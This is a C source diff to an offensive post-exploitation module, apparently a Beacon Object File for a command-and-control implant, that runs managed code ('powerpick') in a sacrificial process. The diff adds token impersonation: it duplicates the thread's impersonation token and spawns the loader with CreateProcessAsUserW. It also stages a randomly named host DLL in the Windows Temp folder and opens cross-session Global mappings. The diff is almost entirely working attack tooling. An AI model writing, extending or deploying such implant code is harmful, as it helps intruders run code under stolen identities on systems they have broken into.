@@ -230,7 +230,12 @@ static BOOL EndsWithIgnoreCase(const char* path, const char* suffix)
     return TRUE;
 }
 
-static BOOL WriteTempDll(const char* dllBytes, int dllLen, char* outPath, size_t outPathLen)
+static BOOL WriteTempDll(
+    const char* dllBytes,
+    int dllLen,
+    char* outPath,
+    size_t outPathLen,
+    BOOL useWindowsTemp)
 {
     char tempDir[MAX_PATH];
     char name[TMPBUFLEN] = { 'p', 'p', 'f' };
@@ -243,9 +248,18 @@ static BOOL WriteTempDll(const char* dllBytes, int dllLen, char* outPath, size_t
         return FALSE;
     }
 
-    n = KERNEL32$GetTempPathA((DWORD)sizeof(tempDir), tempDir);
-    if (n == 0 || n >= sizeof(tempDir)) {
-        return FALSE;
+    if (useWindowsTemp) {
+        /* Cross-session impersonation often cannot read the agent's %TEMP%. */
+        n = KERNEL32$GetWindowsDirectoryA(tempDir, (UINT)sizeof(tempDir));
+        if (n == 0 || n >= sizeof(tempDir) - 6) {
+            return FALSE;
+        }
+        MSVCRT$_snprintf(tempDir + n, sizeof(tempDir) - n, "\\Temp\\");
+    } else {
+        n = KERNEL32$GetTempPathA((DWORD)sizeof(tempDir), tempDir);
+        if (n == 0 || n >= sizeof(tempDir)) {
+            return FALSE;
+        }
     }
 
     gen_rand_str(name, 3, 8);
@@ -270,6 +284,83 @@ static BOOL WriteTempDll(const char* dllBytes, int dllLen, char* outPath, size_t
         return FALSE;
     }
     return TRUE;
+}
+
+static BOOL PpfCreateSacrificial(
+    BOOL useImpersonate,
+    wchar_t* loaderW,
+    wchar_t* cmdW,
+    LPSTARTUPINFOW si,
+    LPPROCESS_INFORMATION pi)
+{
+    HANDLE hThreadToken = NULL;
+    HANDLE hPrimary = NULL;
+    BOOL ok;
+
+    if (!useImpersonate) {
+        return KERNEL32$CreateProcessW(
+            loaderW,
+            cmdW,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            si,
+            pi);
+    }
+
+    if (!ADVAPI32$OpenThreadToken(
+            KERNEL32$GetCurrentThread(),
+            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+            FALSE,
+            &hThreadToken)) {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "[!] --impersonate set but no thread impersonation token (err=%lu)",
+            KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    if (!ADVAPI32$DuplicateTokenEx(
+            hThreadToken,
+            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
+                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
+            NULL,
+            SecurityImpersonation,
+            TokenPrimary,
+            &hPrimary)) {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "[!] DuplicateTokenEx failed (err=%lu)",
+            KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hThreadToken);
+        return FALSE;
+    }
+
+    ok = ADVAPI32$CreateProcessAsUserW(
+        hPrimary,
+        loaderW,
+        cmdW,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        si,
+        pi);
+    if (!ok) {
+        BeaconPrintf(
+            CALLBACK_ERROR,
+            "[!] CreateProcessAsUser failed (err=%lu)",
+            KERNEL32$GetLastError());
+    }
+
+    KERNEL32$CloseHandle(hPrimary);
+    KERNEL32$CloseHandle(hThreadToken);
+    return ok;
 }
 
 typedef struct _PPF_IMPORT_BLOB {
@@ -481,7 +572,7 @@ static int PpfResolveImportNames(
         if (blob == NULL) {
             BeaconPrintf(
                 CALLBACK_ERROR,
-                "[!] session import '%s' is not cached; re-run powerpick-fork-load\n",
+                "[!] session import '%s' is not cached; re-run powerpick-load\n",
                 nameStart);
             *cursor = saved;
             return -1;
@@ -503,6 +594,8 @@ void go(IN PCHAR buffer, IN ULONG blength)
     char* managedPe;
     int managedLen = 0;
     char* managedArgs;
+    char* impersonateFlag = NULL;
+    BOOL useImpersonate = FALSE;
     char slotName[TMPBUFLEN] = { 'p', 'p', 'f', 's', '-' };
     char mapRand[TMPBUFLEN] = { 'p', 'p', 'f' };
     char slotPath[PPF_SLOT_MAX];
@@ -533,7 +626,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     BeaconDataParse(&parser, buffer, blength);
     op = BeaconDataExtract(&parser, NULL);
     if (op == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick-fork: missing operation");
+        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: missing operation");
         return;
     }
 
@@ -546,7 +639,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         return;
     }
     if (MSVCRT$strncmp(op, "exec", 4) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick-fork: unknown op '%s'", op);
+        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: unknown op '%s'", op);
         return;
     }
 
@@ -554,6 +647,11 @@ void go(IN PCHAR buffer, IN ULONG blength)
     hostDll = BeaconDataExtract(&parser, &hostDllLen);
     managedPe = BeaconDataExtract(&parser, &managedLen);
     managedArgs = BeaconDataExtract(&parser, NULL);
+    impersonateFlag = BeaconDataExtract(&parser, NULL);
+    useImpersonate =
+        (impersonateFlag != NULL &&
+         impersonateFlag[0] == '1' &&
+         impersonateFlag[1] == '\0');
 
     if (spawnto == NULL || spawnto[0] == '\0') {
         spawnto = PPF_DEFAULT_SPAWNTO;
@@ -561,7 +659,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
     if (hostDll == NULL || hostDllLen <= 0 ||
         managedPe == NULL || managedLen <= 0 ||
         managedArgs == NULL || managedArgs[0] == '\0') {
-        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick-fork: missing host DLL, managed PE, or args");
+        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: missing host DLL, managed PE, or args");
         return;
     }
 
@@ -572,7 +670,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         execArgs,
         sizeof(execArgs));
     if (importCount < 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick-fork: invalid exec args / imports");
+        BeaconPrintf(CALLBACK_ERROR, "[!] powerpick: invalid exec args / imports");
         return;
     }
 
@@ -585,7 +683,12 @@ void go(IN PCHAR buffer, IN ULONG blength)
     gen_rand_str(slotName, 5, 8);
     gen_rand_str(mapRand, 3, 8);
     MSVCRT$_snprintf(slotPath, sizeof(slotPath), "\\\\.\\mailslot\\%s", slotName);
-    MSVCRT$_snprintf(mapName, sizeof(mapName), "Local\\%s", mapRand);
+    /* Global\ so a child in another session can still open the mapping. */
+    if (useImpersonate) {
+        MSVCRT$_snprintf(mapName, sizeof(mapName), "Global\\%s", mapRand);
+    } else {
+        MSVCRT$_snprintf(mapName, sizeof(mapName), "Local\\%s", mapRand);
+    }
 
     MSVCRT$memset(&pi, 0, sizeof(pi));
     MSVCRT$memset(&si, 0, sizeof(si));
@@ -653,7 +756,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         }
     }
 
-    if (!WriteTempDll(hostDll, hostDllLen, dllPath, sizeof(dllPath))) {
+    if (!WriteTempDll(hostDll, hostDllLen, dllPath, sizeof(dllPath), useImpersonate)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to stage host DLL (err=%lu)", KERNEL32$GetLastError());
         goto cleanup;
     }
@@ -679,22 +782,7 @@ void go(IN PCHAR buffer, IN ULONG blength)
         goto cleanup;
     }
 
-    if (!KERNEL32$CreateProcessW(
-            loaderW,
-            cmdW,
-            NULL,
-            NULL,
-            FALSE,
-            CREATE_NO_WINDOW,
-            NULL,
-            NULL,
-            &si,
-            &pi)) {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "[!] CreateProcess(%s) failed (err=%lu)",
-            loader,
-            KERNEL32$GetLastError());
+    if (!PpfCreateSacrificial(useImpersonate, loaderW, cmdW, &si, &pi)) {
         goto cleanup;
     }
     createdProcess = TRUE;
